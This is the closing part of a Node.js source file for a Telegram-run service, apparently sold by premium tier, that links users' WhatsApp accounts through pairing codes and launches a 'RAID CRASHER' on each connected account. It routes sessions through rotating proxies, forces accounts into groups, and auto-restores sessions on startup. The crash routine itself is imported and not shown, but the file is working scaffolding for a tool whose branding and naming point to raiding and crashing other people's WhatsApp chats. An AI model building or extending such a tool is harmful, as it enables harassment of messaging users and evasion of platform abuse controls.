      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const input = match[1].trim();
    const validation = validateTelegramId(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, `❌ Missing ID\n\nUsage: /delprem <telegram_id>\nExample: /delprem 1234567890`);

    const targetId = validation.id;
    if (!telebase.isPremium(targetId)) return telegramBot.sendMessage(chatId, `⚠️ ID ${targetId} is not a premium user.`);

    telebase.removePremium(targetId);

    const userBots = Array.from(activeBots.entries()).filter(([botId]) => botId.startsWith(`${targetId}_`));
    userBots.forEach(([botId, bot]) => {
      try { bot.sock.ev.removeAllListeners(); bot.sock.end(undefined); activeBots.delete(botId); } catch (e) {}
    });

    telegramBot.sendMessage(chatId, `🚫 Premium revoked\n\n👤 ID: ${targetId}\n🤖 Bots removed: ${userBots.length}\n\n   👿 "The chosen have fallen"`);

    try {
      telegramBot.sendMessage(targetId, `⛔ Premium revoked.\n\n「𖦠」Your access has been removed.\n📱 Contact: ${OWNER_USERNAME}`);
    } catch (err) {
      console.log(chalk.yellow('Could not notify user of prem removal'));
    }
  });

  // ============================================
  // /BAN COMMAND (OWNER ONLY)
  // ============================================
  telegramBot.onText(/\/ban(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;

    if (chatId.toString() !== OWNER_TELEGRAM_ID) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const input = match[1].trim();
    const validation = validateTelegramId(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, validation.message);

    const targetId = validation.id;
    if (targetId === OWNER_TELEGRAM_ID) return telegramBot.sendMessage(chatId, `⛔ Cannot banish the Commander.`);

    telebase.banUser(targetId);

    const userBots = Array.from(activeBots.entries()).filter(([botId]) => botId.startsWith(`${targetId}_`));
    userBots.forEach(([botId, bot]) => {
      try { bot.sock.ev.removeAllListeners(); bot.sock.end(undefined); activeBots.delete(botId); } catch (e) {}
    });

    telegramBot.sendMessage(chatId, `🚫 Raider banished!\n\n👤 ID: ${targetId}\n🤖 Bots removed: ${userBots.length}\n\n   👿 "Banished from the Meta" 🖤`);

    try {
      telegramBot.sendMessage(targetId, `🚫 You have been banished!\n\n📱 Contact: ${OWNER_USERNAME}`);
    } catch (err) {}
  });

  // ============================================
  // /UNBAN COMMAND (OWNER ONLY)
  // ============================================
  telegramBot.onText(/\/unban(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;

    if (chatId.toString() !== OWNER_TELEGRAM_ID) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const input = match[1].trim();
    const validation = validateTelegramId(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, validation.message);

    const targetId = validation.id;
    telebase.unbanUser(targetId);

    telegramBot.sendMessage(chatId, `✅ Raider unbanished!\n\n👤 ID: ${targetId}\n\n   👿 "Redemption granted" 🖤`);

    try {
      telegramBot.sendMessage(targetId, `✅ You have been unbanished!\n\n「𖦠」Welcome back Malovalent!\n📱 Use /start to begin.`);
    } catch (err) {}
  });

  console.log(chalk.green('✅ All Telegram commands initialized'));

} else {
  console.log(chalk.yellow("⚠️ TELEGRAM_BOT_TOKEN not configured"));
}

// ============================================
// startBotInstance
// ============================================
async function startBotInstance(chatId, phoneNumber, botId) {
  await baileysReady;
  const authPath = path.join(__dirname, 'auth', botId);
  await fs.ensureDir(authPath);

  const credsFilePath = path.join(authPath, 'creds.json');
  const { state, saveCreds } = await useMultiFileAuthState(authPath);
  const { version } = await fetchLatestBaileysVersion();
  const pairingCode = !!phoneNumber;

  const socketOptions = {
    version,
    auth: state,
    printQRInTerminal: false,
    logger: require("pino")({ level: process.env.DEBUG === 'true' ? "debug" : "silent" }),
    syncFullHistory: false,
    markOnlineOnConnect: true,
    keepAliveIntervalMs: 30000,
    retryRequestDelayMs: 250,
    getMessage: async (key) => { return { conversation: "" }; }
  };

  if (proxyManager.getTotalProxies() > 0) {
    try {
      const proxyAgent = global.instanceProxyIndex !== null
        ? proxyManager.getProxyByIndex(global.instanceProxyIndex)
        : proxyManager.getNextProxy();
      if (proxyAgent && typeof proxyAgent === 'object') {
        socketOptions.agent = proxyAgent;
        console.log(chalk.cyan(`🔒 Proxy enabled for ${phoneNumber}`));
      }
    } catch (err) {
      console.log(chalk.yellow(`⚠️ Proxy setup failed for ${phoneNumber}: ${err.message}`));
    }
  }

  const sock = makeWASocket(socketOptions);

  const botInstance = {
    sock, phoneNumber, chatId,
    connected: false, startTime: Date.now(),
    raidInitialized: false, pairingCodeSent: false, paired: false
  };

  activeBots.set(botId, botInstance);

  try {
    if (fs.existsSync(credsFilePath)) {
      const raw = fs.readFileSync(credsFilePath, 'utf8') || '{}';
      const parsed = JSON.parse(raw);
      if (parsed?.me) { botInstance.paired = true; console.log(chalk.cyan(`ℹ️ Found existing creds for ${botId}`)); }
    }
  } catch (err) {
    console.warn(chalk.yellow('Could not read creds file pre-check:'), err);
  }

  sock.ev.on("creds.update", async (creds) => {
    try { await saveCreds(creds); } catch (e) { console.error(chalk.red('Error saving creds:'), e); }
    if (creds?.me) {
      botInstance.paired = true;
      console.log(chalk.green(`✅ Creds saved for ${botId}.`));
      try {
        const added = addOwner(phoneNumber);
        if (added) console.log(chalk.green(`✅ Auto-added ${phoneNumber} to owner.json`));
        createOwnerConfig(phoneNumber);
      } catch (e) { console.error(chalk.red('Failed to auto-add owner:'), e); }
    }
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      console.log(chalk.green(`✅ RAID CRASHER online for ${phoneNumber} (User: ${chatId})`));
      botInstance.connected = true;
      telebase.mapPhoneToOwner(phoneNumber, chatId);

      try {
        const userJid = sock.user?.id;
        if (userJid && userJid.includes('@lid')) {
          const lidNumber = userJid.split('@')[0];
          const mappingDir = path.join(__dirname, 'auth', botId);
          await fs.ensureDir(mappingDir);
          const reverseMappingFile = path.join(mappingDir, `lid-mapping-${lidNumber}_reverse.json`);
          fs.writeFileSync(reverseMappingFile, JSON.stringify(phoneNumber));
          console.log(chalk.green(`✅ Created LID mapping: ${lidNumber} -> ${phoneNumber}`));
        }
      } catch (err) {
        console.error(chalk.red('Error creating LID mapping:'), err);
      }

      if (FORCE_JOIN_CONFIG.ENABLED) {
        const userJid = sock.user?.id;
        setTimeout(async () => {
          try { await forceJoinWhatsApp(sock, userJid || phoneNumber); } catch (err) {
            console.error(chalk.red(`❌ Force join error for ${phoneNumber}:`), err);
          }
        }, 5000);
      }

      if (!botInstance.raidInitialized) {
        console.log(chalk.red(`「𖦠」Launching RAID CRASHER for ${phoneNumber}...`));
        await startRaidCrasher(sock, phoneNumber, chatId);
        botInstance.raidInitialized = true;

        const { getOwnerConfig } = require('./src/lib/owner');
        if (!global.presenceIntervals) global.presenceIntervals = new Map();
        if (global.presenceIntervals.has(botId)) {
          clearInterval(global.presenceIntervals.get(botId));
          global.presenceIntervals.delete(botId);
        }

        const presenceInterval = setInterval(async () => {
          try {
            const ownerConfig = getOwnerConfig(phoneNumber);
            if (ownerConfig?.alwaysonline) { await sock.sendPresenceUpdate('available'); }
            else if (ownerConfig?.alwaysoffline) { await sock.sendPresenceUpdate('unavailable'); }
          } catch (e) {
            clearInterval(global.presenceIntervals.get(botId));
            global.presenceIntervals.delete(botId);
          }
        }, 10000);

        global.presenceIntervals.set(botId, presenceInterval);
      }
    }

    if (connection === "close") {
      botInstance.connected = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const isLoggedOut = statusCode === DisconnectReason.loggedOut;
      console.log(chalk.red(`❌ Connection closed for ${phoneNumber}. statusCode: ${statusCode}`));

      if (!isLoggedOut) {
        if (Number(statusCode) === 515) console.log(chalk.yellow(`🔄 Stream error (515) for ${phoneNumber} — retrying...`));
        try { sock.ev.removeAllListeners(); sock.end(); } catch (e) {}
        const reconnectDelay = Number(statusCode) === 515 ? 10000 : 3000;
        setTimeout(async () => {
          activeBots.delete(botId);
          try { await startBotInstance(chatId, phoneNumber, botId); } catch (err) {
            console.error(chalk.red(`❌ Failed to restart bot for ${phoneNumber}:`), err);
          }
        }, reconnectDelay);
      } else {
        console.log(chalk.yellow(`⚠️ ${phoneNumber} logged out manually.`));
        activeBots.delete(botId);
        try {
          const removed = removeOwner(phoneNumber);
          if (removed) console.log(chalk.green(`✅ Auto-removed ${phoneNumber} from owner.json`));
          removeOwnerConfig(phoneNumber);
        } catch (e) {}

        if (telegramBot) {
          try {
            await telegramBot.sendMessage(chatId, `⛔ Bot destroyed for +${phoneNumber}\n\n「𖦠」Use /pair to redeploy.`);
          } catch (e) {}
        }

        try {
          if (fs.existsSync(authPath)) { fs.removeSync(authPath); console.log(chalk.green(`✅ Removed auth folder for ${botId}`)); }
        } catch (err) {}
      }
    }
  });

  if (pairingCode && !state.creds.registered && !botInstance.pairingCodeSent) {
    botInstance.pairingCodeSent = true;
    setTimeout(async () => {
      try {
        let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''), 'NIGHTRAD');
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        if (telegramBot) {
          await telegramBot.sendMessage(chatId,
            `╔════════════════════════        ════╗\n║  「𖦠」 PAIRING CODE 「𖦠」   ║\n╚══════════════════════════════ ═════╝\n\n「𖦠」Code (tap to copy):\n<code>${code}</code>\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 Instructions:\n1. Open WhatsApp\n2. Go to Settings\n3. Tap Linked Devices\n4. Tap Link a Device\n5. Tap Link with Phone Number\n6. Enter code above\n\n⏰ Expires in 60 seconds\n\n   💥 "Deploy the ▼・ᴥ・▼ ɪɴsᴛᴀɴᴄᴇ"`,
            { parse_mode: 'HTML' }
          );
        }
        console.log(chalk.cyan(`📲 Pairing code for ${phoneNumber}: ${code}`));
      } catch (err) {
        console.error(chalk.red(`❌ Pairing code failed for ${phoneNumber}:`), err.message);
        if (telegramBot) {
          await telegramBot.sendMessage(chatId, `⛔ Failed to generate code!\n\n ${err.message}\n\nTry /disconnect then /pair again.`).catch(() => {});
        }
      }
    }, 1703);
  }
}

// ============================================
// SESSION RESTORATION ON STARTUP
// ============================================
async function restoreExistingSessions() {
  const authDir = path.join(__dirname, 'auth');
  if (!fs.existsSync(authDir)) {
    console.log(chalk.yellow('📂 No auth directory found, starting fresh'));
    return;
  }

  const sessionFolders = fs.readdirSync(authDir);
  console.log(chalk.cyan(`📂 Found ${sessionFolders.length} session folders to restore`));

  for (const folder of sessionFolders) {
    const credsPath = path.join(authDir, folder, 'creds.json');
    if (fs.existsSync(credsPath)) {
      try {
        const parts = folder.split('_');
        if (parts.length >= 2) {
          const chatId = parts[0];
          const phoneNumber = parts.slice(1).join('_');
          const botId = folder;
          if (!activeBots.has(botId)) {
            console.log(chalk.cyan(`🔄 Restoring session for ${phoneNumber} (${chatId})`));
            await startBotInstance(chatId, phoneNumber, botId);
            await new Promise(resolve => setTimeout(resolve, 2000));
          }
        }
      } catch (err) {
        console.error(chalk.red(`❌ Failed to restore session ${folder}:`), err);
      }
    }
  }
}

// ============================================
// LAUNCH
// ============================================
restoreExistingSessions().then(() => {
  console.log(chalk.red(' 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 ONLINE -  𝑽𝑬𝑵𝑶𝑴 DOMINATE '));
  console.log(chalk.red('VENOM'.repeat(20)));
  console.log(chalk.white('✅ FULLY OPERATIONAL - Created by 𝑽𝑬𝑵𝑶𝑴 '));
  console.log(chalk.red('ʕ•ᴥ•ʔ'.repeat(20)));
});

// ============================================
// EXPORTS
// ============================================
module.exports = { activeBots, telegramBot, getUptime };

// ============================================
// END OF INDEX.JS
// 𝑴𝒀𝑺𝑻𝑰𝑪 CRASHER 
// CREATED BY 𝑴𝒀𝑺𝑻𝑰𝑪  🖤
// Telegram: @mystichimself
// ============================================